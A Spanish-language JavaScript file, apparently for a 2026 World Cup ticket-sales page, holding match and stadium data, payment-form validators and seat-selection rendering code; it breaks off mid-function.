// Variables globales
let selectedSeats = [];
let currentPrice = 1450;
let currentMatch = "";

// Datos de los partidos (20 partidos)
const matches = [
    { id: 1, local: "México", visitante: "Sudáfrica", fecha: "11 JUN 2026", sede: "Estadio Azteca", ciudad: "Ciudad de México", pais: "mexico", fase: "grupo A", precio: 2450, imagen: "/src/azteca.jpg", categoria: "vip", destacado: "GRUPO A" },
    { id: 2, local: "Corea del Sur", visitante: "República Checa", fecha: "11 JUN 2026", sede: "Akron", ciudad: "Zapopan", pais: "mexico", fase: "grupo A", precio: 1890, imagen: "/src/akron.jpg", categoria: "premium", destacado: "GRUPO A" },

    { id: 3, local: "Canadá", visitante: "Bosnia-Herzegovina", fecha: "12 JUN 2026", sede: "BMO Field", ciudad: "Toronto", pais: "canada", fase: "grupo B", precio: 2750, imagen: "/src/bmo.jpg", categoria: "general", destacado: "GRUPO B" },
    { id: 4, local: "EE.UU", visitante: "Paraguay", fecha: "12 JUN 2026", sede: "SoFi Stadium", ciudad: "Inglewood", pais: "usa", fase: "grupo D", precio: 1600, imagen: "/src/akron.jpg", categoria: "premium", destacado: "GRUPO D" },

    { id: 5, local: "Haití", visitante: "Escocia", fecha: "12 JUN 2026", sede: "Gillette Stadium", ciudad: "Foxborough", pais: "usa", fase: "grupo C", precio: 2300, imagen: "/src/bmo.jpg", categoria: "general", destacado: "GRUPO C" },
    { id: 6, local: "Australia", visitante: "Turquía", fecha: "13 JUN 2026", sede: "BC Place Vancouver", ciudad: "Vancouver", pais: "canada", fase: "grupo D", precio: 1950, imagen: "/src/sofi.jpg", categoria: "general", destacado: "GRUPO D" },
    { id: 7, local: "Brasil", visitante: "Marruecos", fecha: "13 JUN 2026", sede: "MetLife Stadium", ciudad: "East Rutherford", pais: "usa", fase: "grupo C", precio: 2100, imagen: "/src/levis.jpg", categoria: "general", destacado: "GRUPO C" },
    { id: 8, local: "Catar", visitante: "Suiza", fecha: "13 JUN 2026", sede: "Levi's Stadium", ciudad: "Santa Clara", pais: "usa", fase: "grupo B", precio: 2800, imagen: "/src/metlife.jpg", categoria: "premium", destacado: "GRUPO B" },

    { id: 9, local: "Costa de Marfil", visitante: "Ecuador", fecha: "14 JUN 2026", sede: "Lincoln Financial Field", ciudad: "Filadelfia", pais: "usa", fase: "grupo E", precio: 1700, imagen: "/src/gilette.jpg", categoria: "general", destacado: "GRUPO E" },
    { id: 10, local: "Alemania", visitante: "Curazao", fecha: "14 JUN 2026", sede: "NRG Stadium", ciudad: "Houston", pais: "usa", fase: "grupo E", precio: 2550, imagen: "/src/bc.jpg", categoria: "vip", destacado: "GRUPO E" },
    { id: 11, local: "Países Bajos", visitante: "Japón", fecha: "14 JUN 2026", sede: "AT&T Stadium", ciudad: "Arlington", pais: "usa", fase: "grupo F", precio: 1850, imagen: "/src/att.jpg", categoria: "vip", destacado: "GRUPO F" },
    { id: 12, local: "Suecia", visitante: "Túnez", fecha: "14 JUN 2026", sede: "BBVA", ciudad: "Guadalupe", pais: "mexico", fase: "grupo F", precio: 2950, imagen: "/src/bbva.jpg", categoria: "general", destacado: "GRUPO F" },

    { id: 13, local: "Arabia Saudita", visitante: "Uruguay", fecha: "15 JUN 2026", sede: "Hard Rock Stadium", ciudad: "Miami", pais: "usa", fase: "grupo H", precio: 1750, imagen: "/src/hard.jpg", categoria: "general", destacado: "GRUPO H" },
    { id: 14, local: "España", visitante: "Cabo Verde", fecha: "15 JUN 2026", sede: "Mercedes-Benz Stadium", ciudad: "Atlanta", pais: "usa", fase: "grupo H", precio: 2200, imagen: "/src/mercedes.jpg", categoria: "premium", destacado: "GRUPO H" },
    { id: 15, local: "Irán", visitante: "Nueva Zelanda", fecha: "15 JUN 2026", sede: "SoFi Stadium", ciudad: "Inglewood", pais: "usa", fase: "grupo G", precio: 1900, imagen: "/src/sofi.jpg", categoria: "vip", destacado: "GRUPO G" },
    { id: 16, local: "Bélgica", visitante: "Egipto", fecha: "15 JUN 2026", sede: "Lumen Field", ciudad: "Seattle", pais: "usa", fase: "grupo G", precio: 2600, imagen: "/src/lumen.jpg", categoria: "premium", destacado: "GRUPO G" },

    { id: 17, local: "Francia", visitante: "Senegal", fecha: "16 JUN 2026", sede: "MetLife Stadium", ciudad: "East Rutherford", pais: "usa", fase: "grupo I", precio: 2000, imagen: "/src/metlife.jpg", categoria: "premium", destacado: "GRUPO I" },
    { id: 18, local: "Irak", visitante: "Noruega", fecha: "16 JUN 2026", sede: "Gillette Stadium", ciudad: "Foxborough", pais: "usa", fase: "grupo I", precio: 1650, imagen: "/src/gilette.jpg", categoria: "general", destacado: "GRUPO I" },
    { id: 19, local: "Argentina", visitante: "Argelia", fecha: "16 JUN 2026", sede: "Arrowhead Stadium", ciudad: "Kansas City", pais: "usa", fase: "grupo J", precio: 2700, imagen: "/src/arrowhead.jpg", categoria: "vip", destacado: "GRUPO J" },
    { id: 20, local: "Austria", visitante: "Jordania", fecha: "16 JUN 2026", sede: "Levi's Stadium", ciudad: "Santa Clara", pais: "usa", fase: "grupo J", precio: 1800, imagen: "/src/levis.jpg", categoria: "vip", destacado: "GRUPO J" },

    { id: 21, local: "Ghana", visitante: "Panamá", fecha: "17 JUN 2026", sede: "BMO Field", ciudad: "Toronto", pais: "canada", fase: "grupo L", precio: 2400, imagen: "/src/bmo.jpg", categoria: "general", destacado: "GRUPO L" },
    { id: 22, local: "Inglaterra", visitante: "Croacia", fecha: "17 JUN 2026", sede: "AT&T Stadium", ciudad: "Arlington", pais: "usa", fase: "grupo L", precio: 1550, imagen: "/src/att.jpg", categoria: "general", destacado: "GRUPO L" },
    { id: 23, local: "Portugal", visitante: "República Democrática del Congo", fecha: "17 JUN 2026", sede: "NRG Stadium", ciudad: "Houston", pais: "usa", fase: "grupo K", precio: 2850, imagen: "/src/nrg.jpg", categoria: "general", destacado: "GRUPO K" },
    { id: 24, local: "Uzbekistán", visitante: "Colombia", fecha: "17 JUN 2026", sede: "Estadio Azteca", ciudad: "Ciudad de México", pais: "mexico", fase: "grupo K", precio: 2150, imagen: "/src/azteca.jpg", categoria: "general", destacado: "GRUPO K" },

    { id: 25, local: "República Checa", visitante: "Sudáfrica", fecha: "18 JUN 2026", sede: "Mercedes-Benz Stadium", ciudad: "Atlanta", pais: "usa", fase: "grupo A", precio: 1700, imagen: "/src/mercedes.jpg", categoria: "general", destacado: "GRUPO A" },
    { id: 26, local: "Suiza", visitante: "Bosnia-Herzegovina", fecha: "18 JUN 2026", sede: "SoFi Stadium", ciudad: "Inglewood", pais: "usa", fase: "grupo B", precio: 2500, imagen: "/src/sofi.jpg", categoria: "general", destacado: "GRUPO B" },
    { id: 27, local: "Canadá", visitante: "Catar", fecha: "18 JUN 2026", sede: "BC Place Vancouver", ciudad: "Vancouver", pais: "canada", fase: "grupo B", precio: 1800, imagen: "/src/bc.jpg", categoria: "general", destacado: "GRUPO B" },
    { id: 28, local: "México", visitante: "Corea del Sur", fecha: "18 JUN 2026", sede: "Akron", ciudad: "Zapopan", pais: "mexico", fase: "grupo A", precio: 2900, imagen: "/src/akron.jpg", categoria: "general", destacado: "GRUPO A" },

    { id: 29, local: "Brasil", visitante: "Haití", fecha: "19 JUN 2026", sede: "Lincoln Financial Field", ciudad: "Filadelfia", pais: "usa", fase: "grupo C", precio: 1600, imagen: "/src/lincoln.jpg", categoria: "general", destacado: "GRUPO C" },
    { id: 30, local: "Escocia", visitante: "Marruecos", fecha: "19 JUN 2026", sede: "Gillette Stadium", ciudad: "Foxborough", pais: "usa", fase: "grupo C", precio: 2350, imagen: "/src/gilette.jpg", categoria: "general", destacado: "GRUPO C" },
    { id: 31, local: "Turquía", visitante: "Paraguay", fecha: "19 JUN 2026", sede: "Levi's Stadium", ciudad: "Santa Clara", pais: "usa", fase: "grupo D", precio: 1750, imagen: "/src/levis.jpg", categoria: "general", destacado: "GRUPO D" },
    { id: 32, local: "Estados Unidos", visitante: "Australia", fecha: "19 JUN 2026", sede: "Lumen Field", ciudad: "Seattle", pais: "usa", fase: "grupo D", precio: 2650, imagen: "/src/lumen.jpg", categoria: "general", destacado: "GRUPO D" },

    { id: 33, local: "Alemania", visitante: "Costa de Marfil", fecha: "20 JUN 2026", sede: "BMO Field", ciudad: "Toronto", pais: "canada", fase: "grupo E", precio: 2050, imagen: "/src/bmo.jpg", categoria: "general", destacado: "GRUPO E" },
    { id: 34, local: "Ecuador", visitante: "Curazao", fecha: "20 JUN 2026", sede: "Arrowhead Stadium", ciudad: "Kansas City", pais: "usa", fase: "grupo E", precio: 1950, imagen: "/src/arrowhead.jpg", categoria: "general", destacado: "GRUPO E" },
    { id: 35, local: "Países Bajos", visitante: "Suecia", fecha: "20 JUN 2026", sede: "NRG Stadium", ciudad: "Houston", pais: "usa", fase: "grupo F", precio: 2200, imagen: "/src/nrg.jpg", categoria: "general", destacado: "GRUPO F" },
    { id: 36, local: "Túnez", visitante: "Japón", fecha: "20 JUN 2026", sede: "BBVA", ciudad: "Guadalupe", pais: "mexico", fase: "grupo F", precio: 1700, imagen: "/src/bbva.jpg", categoria: "general", destacado: "GRUPO F" },

    { id: 37, local: "Uruguay", visitante: "Cabo Verde", fecha: "21 JUN 2026", sede: "Hard Rock Stadium", ciudad: "Miami", pais: "usa", fase: "grupo H", precio: 2800, imagen: "/src/hard.jpg", categoria: "general", destacado: "GRUPO H" },
    { id: 38, local: "España", visitante: "Arabia Saudita", fecha: "21 JUN 2026", sede: "Mercedes-Benz Stadium", ciudad: "Atlanta", pais: "usa", fase: "grupo H", precio: 1850, imagen: "/src/mercedes.jpg", categoria: "general", destacado: "GRUPO H" },
    { id: 39, local: "Bélgica", visitante: "Irán", fecha: "21 JUN 2026", sede: "BC Place Vancouver", ciudad: "Vancouver", pais: "canada", fase: "grupo G", precio: 2400, imagen: "/src/bc.jpg", categoria: "general", destacado: "GRUPO G" },
    { id: 40, local: "Nueva Zelanda", visitante: "Egipto", fecha: "21 JUN 2026", sede: "BC Place Vancouver", ciudad: "Vancouver", pais: "canada", fase: "grupo G", precio: 1600, imagen: "/src/bc.jpg", categoria: "general", destacado: "GRUPO G" },

    { id: 41, local: "Noruega", visitante: "Senegal", fecha: "22 JUN 2026", sede: "MetLife Stadium", ciudad: "East Rutherford", pais: "usa", fase: "grupo I", precio: 2750, imagen: "/src/metlife.jpg", categoria: "general", destacado: "GRUPO I" },
    { id: 42, local: "Francia", visitante: "Irak", fecha: "22 JUN 2026", sede: "Lincoln Financial Field", ciudad: "Filadelfia", pais: "usa", fase: "grupo I", precio: 2100, imagen: "/src/lincoln.jpg", categoria: "general", destacado: "GRUPO I" },
    { id: 43, local: "Argentina", visitante: "Austria", fecha: "22 JUN 2026", sede: "AT&T Stadium", ciudad: "Arlington", pais: "usa", fase: "grupo J", precio: 1750, imagen: "/src/att.jpg", categoria: "general", destacado: "GRUPO J" },
    { id: 44, local: "Jordania", visitante: "Argelia", fecha: "22 JUN 2026", sede: "Levi's Stadium", ciudad: "Santa Clara", pais: "usa", fase: "grupo J", precio: 2550, imagen: "/src/levis.jpg", categoria: "general", destacado: "GRUPO J" },

    { id: 45, local: "Inglaterra", visitante: "Ghana", fecha: "23 JUN 2026", sede: "Gillette Stadium", ciudad: "Foxborough", pais: "usa", fase: "grupo L", precio: 1900, imagen: "/src/gilette.jpg", categoria: "general", destacado: "GRUPO L" },
    { id: 46, local: "Panamá", visitante: "Croacia", fecha: "23 JUN 2026", sede: "BMO Field", ciudad: "Toronto", pais: "canada", fase: "grupo L", precio: 2650, imagen: "/src/bmo.jpg", categoria: "general", destacado: "GRUPO L" },
    { id: 47, local: "Portugal", visitante: "Uzbekistán", fecha: "23 JUN 2026", sede: "NRG Stadium", ciudad: "Houston", pais: "usa", fase: "grupo K", precio: 2000, imagen: "/src/nrg.jpg", categoria: "general", destacado: "GRUPO K" },
    { id: 48, local: "Colombia", visitante: "República Democrática del Congo", fecha: "23 JUN 2026", sede: "Akron", ciudad: "Zapopan", pais: "mexico", fase: "grupo K", precio: 1700, imagen: "/src/akron.jpg", categoria: "general", destacado: "GRUPO K" },

    { id: 49, local: "Escocia", visitante: "Brasil", fecha: "24 JUN 2026", sede: "Hard Rock Stadium", ciudad: "Miami", pais: "usa", fase: "grupo C", precio: 2850, imagen: "/src/hard.jpg", categoria: "general", destacado: "GRUPO C" },
    { id: 50, local: "Marruecos", visitante: "Haití", fecha: "24 JUN 2026", sede: "Mercedes-Benz Stadium", ciudad: "Atlanta", pais: "usa", fase: "grupo C", precio: 1800, imagen: "/src/mercedes.jpg", categoria: "general", destacado: "GRUPO C" },
    { id: 51, local: "Suiza", visitante: "Canadá", fecha: "24 JUN 2026", sede: "BC Place Vancouver", ciudad: "Vancouver", pais: "canada", fase: "grupo B", precio: 2200, imagen: "/src/bc.jpg", categoria: "general", destacado: "GRUPO B" },
    { id: 52, local: "Bosnia-Herzegovina", visitante: "Catar", fecha: "24 JUN 2026", sede: "Lumen Field", ciudad: "Seattle", pais: "usa", fase: "grupo B", precio: 1950, imagen: "/src/lumen.jpg", categoria: "general", destacado: "GRUPO B" },
    { id: 53, local: "República Checa", visitante: "México", fecha: "24 JUN 2026", sede: "Estadio Azteca", ciudad: "Ciudad de México", pais: "mexico", fase: "grupo A", precio: 2500, imagen: "/src/azteca.jpg", categoria: "general", destacado: "GRUPO A" },
    { id: 54, local: "Sudáfrica", visitante: "Corea del Sur", fecha: "24 JUN 2026", sede: "BBVA", ciudad: "Guadalupe", pais: "mexico", fase: "grupo A", precio: 1700, imagen: "/src/bbva.jpg", categoria: "general", destacado: "GRUPO A" },

    { id: 55, local: "Curazao", visitante: "Costa de Marfil", fecha: "25 JUN 2026", sede: "Lincoln Financial Field", ciudad: "Filadelfia", pais: "usa", fase: "grupo E", precio: 2650, imagen: "/src/lincoln.jpg", categoria: "general", destacado: "GRUPO E" },
    { id: 56, local: "Ecuador", visitante: "Alemania", fecha: "25 JUN 2026", sede: "MetLife Stadium", ciudad: "East Rutherford", pais: "usa", fase: "grupo E", precio: 1850, imagen: "/src/metlife.jpg", categoria: "general", destacado: "GRUPO E" },
    { id: 57, local: "Japón", visitante: "Suecia", fecha: "25 JUN 2026", sede: "AT&T Stadium", ciudad: "Arlington", pais: "usa", fase: "grupo F", precio: 2300, imagen: "/src/att.jpg", categoria: "general", destacado: "GRUPO F" },
    { id: 58, local: "Túnez", visitante: "Países Bajos", fecha: "25 JUN 2026", sede: "Arrowhead Stadium", ciudad: "Kansas City", pais: "usa", fase: "grupo F", precio: 2000, imagen: "/src/arrowhead.jpg", categoria: "general", destacado: "GRUPO F" },
    { id: 59, local: "Turquía", visitante: "Estados Unidos", fecha: "25 JUN 2026", sede: "SoFi Stadium", ciudad: "Inglewood", pais: "usa", fase: "grupo D", precio: 2750, imagen: "/src/sofi.jpg", categoria: "general", destacado: "GRUPO D" },
    { id: 60, local: "Paraguay", visitante: "Australia", fecha: "25 JUN 2026", sede: "Levi's Stadium", ciudad: "Santa Clara", pais: "usa", fase: "grupo D", precio: 1600, imagen: "/src/levis.jpg", categoria: "general", destacado: "GRUPO D" },

    { id: 61, local: "Noruega", visitante: "Francia", fecha: "26 JUN 2026", sede: "Gillette Stadium", ciudad: "Foxborough", pais: "usa", fase: "grupo I", precio: 2900, imagen: "/src/gilette.jpg", categoria: "general", destacado: "GRUPO I" },
    { id: 62, local: "Senegal", visitante: "Irak", fecha: "26 JUN 2026", sede: "BMO Field", ciudad: "Toronto", pais: "canada", fase: "grupo I", precio: 1750, imagen: "/src/bmo.jpg", categoria: "general", destacado: "GRUPO I" },
    { id: 63, local: "Egipto", visitante: "Irán", fecha: "26 JUN 2026", sede: "Lumen Field", ciudad: "Seattle", pais: "usa", fase: "grupo G", precio: 2400, imagen: "/src/lumen.jpg", categoria: "general", destacado: "GRUPO G" },
    { id: 64, local: "Nueva Zelanda", visitante: "Bélgica", fecha: "26 JUN 2026", sede: "BC Place Vancouver", ciudad: "Vancouver", pais: "canada", fase: "grupo G", precio: 2050, imagen: "/src/bc.jpg", categoria: "general", destacado: "GRUPO G" },
    { id: 65, local: "Cabo Verde", visitante: "Arabia Saudita", fecha: "26 JUN 2026", sede: "NRG Stadium", ciudad: "Houston", pais: "usa", fase: "grupo H", precio: 1700, imagen: "/src/nrg.jpg", categoria: "general", destacado: "GRUPO H" },
    { id: 66, local: "Uruguay", visitante: "España", fecha: "26 JUN 2026", sede: "Akron", ciudad: "Zapopan", pais: "mexico", fase: "grupo H", precio: 2550, imagen: "/src/akron.jpg", categoria: "general", destacado: "GRUPO H" },

    { id: 67, local: "Panamá", visitante: "Inglaterra", fecha: "27 JUN 2026", sede: "MetLife Stadium", ciudad: "East Rutherford", pais: "usa", fase: "grupo L", precio: 1950, imagen: "/src/metlife.jpg", categoria: "general", destacado: "GRUPO L" },
    { id: 68, local: "Croacia", visitante: "Ghana", fecha: "27 JUN 2026", sede: "Lincoln Financial Field", ciudad: "Filadelfia", pais: "usa", fase: "grupo L", precio: 2200, imagen: "/src/lincoln.jpg", categoria: "general", destacado: "GRUPO L" },
    { id: 69, local: "Argelia", visitante: "Austria", fecha: "27 JUN 2026", sede: "SoFi Stadium", ciudad: "Inglewood", pais: "usa", fase: "grupo J", precio: 2800, imagen: "/src/sofi.jpg", categoria: "general", destacado: "GRUPO J" },
    { id: 70, local: "Jordania", visitante: "Argentina", fecha: "27 JUN 2026", sede: "AT&T Stadium", ciudad: "Arlington", pais: "usa", fase: "grupo J", precio: 1850, imagen: "/src/att.jpg", categoria: "general", destacado: "GRUPO J" },
    { id: 71, local: "Colombia", visitante: "Portugal", fecha: "27 JUN 2026", sede: "Hard Rock Stadium", ciudad: "Miami", pais: "usa", fase: "grupo K", precio: 2650, imagen: "/src/hard.jpg", categoria: "general", destacado: "GRUPO K" },
    { id: 72, local: "República Democrática del Congo", visitante: "Uzbekistán", fecha: "27 JUN 2026", sede: "Mercedes-Benz Stadium", ciudad: "Atlanta", pais: "usa", fase: "grupo K", precio: 2100, imagen: "/src/mercedes.jpg", categoria: "general", destacado: "GRUPO K" },
];

// Datos de las secciones del estadio
const stadiumSections = {
    suites: [
        { id: 'suite1', name: 'Suite Presidencial', capacity: 12, priceMultiplier: 3.5, available: true },
        { id: 'suite2', name: 'Suite Diamante', capacity: 10, priceMultiplier: 3.0, available: true },
        { id: 'suite3', name: 'Suite Platino', capacity: 8, priceMultiplier: 2.8, available: true },
        { id: 'suite4', name: 'Suite Ejecutiva', capacity: 6, priceMultiplier: 2.5, available: false }
    ],
    vip: [
        { row: 'A', seats: 12, priceMultiplier: 2.2 },
        { row: 'B', seats: 12, priceMultiplier: 2.2 },
        { row: 'C', seats: 12, priceMultiplier: 2.2 }
    ],
    premium: [
        { row: 'D', seats: 14, priceMultiplier: 1.3 },
        { row: 'E', seats: 14, priceMultiplier: 1.3 },
        { row: 'F', seats: 14, priceMultiplier: 1.3 },
        { row: 'G', seats: 14, priceMultiplier: 1.3 }
    ],
    general: [
        { row: 'H', seats: 16, priceMultiplier: 1.0 },
        { row: 'I', seats: 16, priceMultiplier: 1.0 },
        { row: 'J', seats: 16, priceMultiplier: 1.0 },
        { row: 'K', seats: 16, priceMultiplier: 1.0 },
        { row: 'L', seats: 16, priceMultiplier: 1.0 }
    ]
};

// Datos de sedes
const venues = [
    { name: "CDMX", flag: "mx", city: "CDMX" },
    { name: "GDL", flag: "mx", city: "GDL" },
    { name: "MTY", flag: "mx", city: "MTY" },
    { name: "NY/NJ", flag: "us", city: "NY/NJ" },
    { name: "LA", flag: "us", city: "LA" },
    { name: "DALLAS", flag: "us", city: "DALLAS" },
    { name: "TORONTO", flag: "ca", city: "TORONTO" },
    { name: "VANCOUVER", flag: "ca", city: "VANCOUVER" }
];

// Funciones de validación
function validateEmail(email) {
    const re = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    return re.test(email);
}

function validateCardNumber(number) {
    const cleanNumber = number.replace(/\s/g, '');
    return /^\d{16}$/.test(cleanNumber);
}

function validateExpiryDate(expiry) {
    const re = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
    if (!re.test(expiry)) return false;

    const [month, year] = expiry.split('/');
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    const expYear = parseInt(year);
    const expMonth = parseInt(month);

    if (expYear < currentYear) return false;
    if (expYear === currentYear && expMonth < currentMonth) return false;
    return true;
}

function validateCVV(cvv) {
    return /^\d{3,4}$/.test(cvv);
}

function validateCardName(name) {
    return name.trim().length >= 5;
}

// Renderizar partidos
function renderMatches(filteredMatches) {
    const container = document.getElementById('matches-container');
    if (!container) return;
    container.innerHTML = '';

    filteredMatches.forEach(match => {
        const matchCard = document.createElement('div');
        matchCard.className = 'bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group match-card';
        matchCard.setAttribute('data-pais', match.pais);
        matchCard.setAttribute('data-fase', match.fase);
        matchCard.setAttribute('data-fecha', match.fecha.includes('JUN') ? 'junio' : 'julio');
        matchCard.setAttribute('data-categoria', match.categoria);

        const destacadoClass = match.destacado === 'FINAL' ? 'ring-2 ring-[--fifa-gold]' : '';
        matchCard.className += ' ' + destacadoClass;

        matchCard.innerHTML = `
            <div class="relative h-40 overflow-hidden">
                <img src="${match.imagen}" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500" alt="Stadium" onerror="this.src='https://via.placeholder.com/400x200?text=Estadio'">
                <div class="absolute inset-0 stadium-gradient"></div>
                <div class="absolute bottom-3 left-3 text-white">
                    <span class="text-[8px] font-bold uppercase ${match.destacado === 'FINAL' ? 'bg-[--fifa-gold] text-black' : 'bg-[--fifa-red]'} px-2 py-1 rounded-full">${match.destacado}</span>
                    <p class="text-sm font-black italic uppercase leading-tight mt-1">${match.local} vs ${match.visitante}</p>
                </div>
            </div>
            <div class="p-4">
                <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
                    <i class="fas fa-calendar"></i> ${match.fecha} | ${match.sede}
                </div>
                <div class="flex justify-between items-center mb-4">
                    <span class="text-2xl font-black text-[--fifa-blue]">$${match.precio.toLocaleString('es-MX')} <span class="text-[8px]">MXN</span></span>
                    <span class="bg-green-100 text-green-700 text-[8px] font-bold px-2 py-1 rounded-full">DISPONIBLE</span>
                </div>
                <button onclick="window.openSeatMap(${match.id}, '${match.local} vs ${match.visitante}', ${match.precio})"
                    class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
            </div>
        `;
        container.appendChild(matchCard);
    });
}

// Renderizar sedes
function renderVenues() {
    const container = document.getElementById('venues-container');
    if (!container) return;
    container.innerHTML = '';

    venues.forEach(venue => {
        const venueDiv = document.createElement('div');
        venueDiv.className = 'text-center';
        venueDiv.innerHTML = `
            <div class="w-16 h-16 mx-auto bg-white rounded-full shadow-lg flex items-center justify-center mb-2">
                <img src="https://flagcdn.com/w40/${venue.flag}.png" class="h-8" alt="${venue.name}">
            </div>
            <p class="font-bold text-sm">${venue.name}</p>
        `;
        container.appendChild(venueDiv);
    });
}

// Función de filtrado
function applyFilters() {
    const sedeFilter = document.getElementById('filter-sede').value;
    const faseFilter = document.getElementById('filter-fase').value;
    const fechaFilter = document.getElementById('filter-fecha').value;
    const categoriaFilter = document.getElementById('filter-categoria').value;

    let filtered = [...matches];

    if (sedeFilter !== 'all') {
        filtered = filtered.filter(m => m.pais === sedeFilter);
    }

    if (faseFilter !== 'all') {
        filtered = filtered.filter(m => m.fase === faseFilter);
    }

    if (fechaFilter !== 'all') {
        filtered = filtered.filter(m => {
            if (fechaFilter === 'junio') return m.fecha.includes('JUN');
            if (fechaFilter === 'julio') return m.fecha.includes('JUL');
            return true;
        });
    }

    if (categoriaFilter !== 'all') {
        filtered = filtered.filter(m => m.categoria === categoriaFilter);
    }

    renderMatches(filtered);
}

// Funciones de selección de asientos
window.toggleSection = function (element) {
    const sectionTier = element.closest('.section-tier');
    if (sectionTier) {
        sectionTier.classList.toggle('expanded');
    }
};

window.selectSeat = function (seatId, price, row, number, type) {
    const existingIndex = selectedSeats.findIndex(s => s.id === seatId);
    if (existingIndex !== -1) {
        selectedSeats.splice(existingIndex, 1);
    } else {
        selectedSeats.push({
            id: seatId,
            price: price,
            row: row,
            number: number,
            type: type,
            displayName: `${type.toUpperCase()} - Fila ${row}, Asiento ${number}`
        });
    }
    updateSeatSummary();
    renderStadiumSections();
};

window.selectSuite = function (suiteId, multiplier, suiteName) {
    const suitePrice = Math.round(currentPrice * multiplier);
    const existingIndex = selectedSeats.findIndex(s => s.id === suiteId);
    if (existingIndex !== -1) {
        selectedSeats.splice(existingIndex, 1);
    } else {
        selectedSeats.push({
            id: suiteId,
            price: suitePrice,
            name: suiteName,
            type: 'suite',
            displayName: `${suiteName} (Suite Ejecutiva)`
        });
    }
    updateSeatSummary();
    renderStadiumSections();
};

function updateSeatSummary() {
    const total = selectedSeats.reduce((sum, seat) => sum + seat.price, 0);

    const listContainer = document.getElementById('selected-seats-list');
    if (selectedSeats.length === 0) {
        listContainer.innerHTML = '<div class="text-sm text-gray-400">No hay asientos seleccionados</div>';
    } else {
        listContainer.innerHTML = selectedSeats.map(seat => {
            if (seat.type === 'suite') {
                return `<div class="flex justify-between text-sm py-2 border-b border-white/10">
                    <span><i class="fas fa-building text-purple-400 mr-2"></i>${seat.name}</span>
                    <span class="text-[--fifa-gold]">$${seat.price.toLocaleString('es-MX')}</span>
                </div>`;
            } else {
                return `<div class="flex justify-between text-sm py-2 border-b border-white/10">
                    <span><i class="fas fa-chair mr-2"></i>Fila ${seat.row} - Asiento ${seat.number}</span>
                    <span class="text-[--fifa-gold]">$${seat.price.toLocaleString('es-MX')}</span>
                </div>`;
            }
        }).join('');
    }

    document.getElementById('modal-total').innerHTML = `$${total.toLocaleString('es-MX')} MXN`;

    // Actualizar total en el modal de pago
    const paymentTotal = document.getElementById('payment-total');
    if (paymentTotal) {
        paymentTotal.innerHTML = `$${total.toLocaleString('es-MX')} MXN`;
    }

    const payBtn = document.getElementById('btn-pay');
    if (selectedSeats.length > 0) {
        payBtn.disabled = false;
        payBtn.classList.remove('bg-gray-600', 'text-gray-300');
        payBtn.classList.add('bg-[--fifa-red]', 'text-white');
    } else {
        payBtn.disabled = true;
        payBtn.classList.add('bg-gray-600', 'text-gray-300');
        payBtn.classList.remove('bg-[--fifa-red]', 'text-white');
    }
}

function renderStadiumSections() {
    const container = document.getElementById('stadium-sections');
    if (!container) return;
    container.innerHTML = '';

    // Suites Ejecutivas
    const suitesDiv = document.createElement('div');
    suitesDiv.className = 'section-tier';
    suitesDiv.innerHTML = `
        <div class="tier-bar suite" onclick="window.toggleSection(this)">
            <span><i class="fas fa-building mr-2"></i> SUITES EJECUTIVAS</span>
            <span>${stadiumSections.suites.filter(s => s.available).length} disponibles</span>
        </div>
        <div class="tier-details">
            <div id="suites-list"></div>
        </div>
    `;
    container.appendChild(suitesDiv);

    // Palcos VIP
    const vipDiv = document.createElement('div');
    vipDiv.className = 'section-tier';
    vipDiv.innerHTML = `
        <div class="tier-bar vip" onclick="window.toggleSection(this)">
            <span><i class="fas fa-crown mr-2"></i> PALCOS VIP</span>
            <span>${stadiumSections.vip.length} filas</span>
        </div>
        <div class="tier-details">
            <div class="seat-grid-mini" id="vip-seats"></div>
        </div>
    `;
    container.appendChild(vipDiv);

    // Preferente
    const premiumDiv = document.createElement('div');
    premiumDiv.className = 'section-tier';
    premiumDiv.innerHTML = `
        <div class="tier-bar premium" onclick="window.toggleSection(this)">
            <span><i class="fas fa-star mr-2"></i> PREFERENTE</span>
            <span>${stadiumSections.premium.length} filas</span>
        </div>
        <div class="tier-details">
            <div class="seat-grid-mini" id="premium-seats"></div>
        </div>
    `;
    container.appendChild(premiumDiv);

    // General
    const generalDiv = document.createElement('div');
    generalDiv.className = 'section-tier';
    generalDiv.innerHTML = `
        <div class="tier-bar general" onclick="window.toggleSection(this)">
            <span><i class="fas fa-users mr-2"></i> GENERAL</span>
            <span>${stadiumSections.general.length} filas</span>
        </div>
        <div class="tier-details">
            <div class="seat-grid-mini" id="general-seats"></div>
        </div>
    `;
    container.appendChild(generalDiv);

    // Renderizar suites
    const suitesList = document.getElementById('suites-list');
    if (suitesList) {
        suitesList.innerHTML = '';
        stadiumSections.suites.forEach(suite => {
            if (suite.available) {
                const isSelected = selectedSeats.some(s => s.id === suite.id);
                const suiteCard = document.createElement('div');
                suiteCard.className = 'suite-card';
                if (isSelected) suiteCard.classList.add('selected-suite');
                suiteCard.innerHTML = `
                    <div class="flex justify-between items-center">
                        <div>
                            <div class="font-bold text-white">${suite.name}</div>
                            <div class="text-xs text-gray-300">Capacidad: ${suite.capacity} personas</div>
                            <div class="text-xs text-[--fifa-gold]">$${(currentPrice * suite.priceMultiplier).toLocaleString('es-MX')} MXN / persona</div>
                        </div>
                        <button onclick="window.selectSuite('${suite.id}', ${suite.priceMultiplier}, '${suite.name}')" class="bg-[--fifa-red] text-white px-3 py-1 rounded-lg text-xs hover:bg-red-700">
                            ${isSelected ? 'Quitar' : 'Seleccionar'}
                        </button>
                    </div>
                `;
                suitesList.appendChild(suiteCard);
            }
        });
    }

    // Renderizar asientos
    renderSeatsInSection('vip-seats', stadiumSections.vip, 2.2, 'vip');
    renderSeatsInSection('premium-seats', stadiumSections.premium, 1.3, 'premium');
    renderSeatsInSection('general-seats', stadiumSections.general, 1.0, 'general');
}

function renderSeatsInSection(containerId, sectionData, multiplier, type) {
    const container = document.getElementById(containerId);
    if (!container) return;
    container.innerHTML = '';

    sectionData.forEach(rowData => {
        const rowDiv = document.createElement('div');
        rowDiv.className = 'flex items-center gap-1 mb-2 flex-wrap';
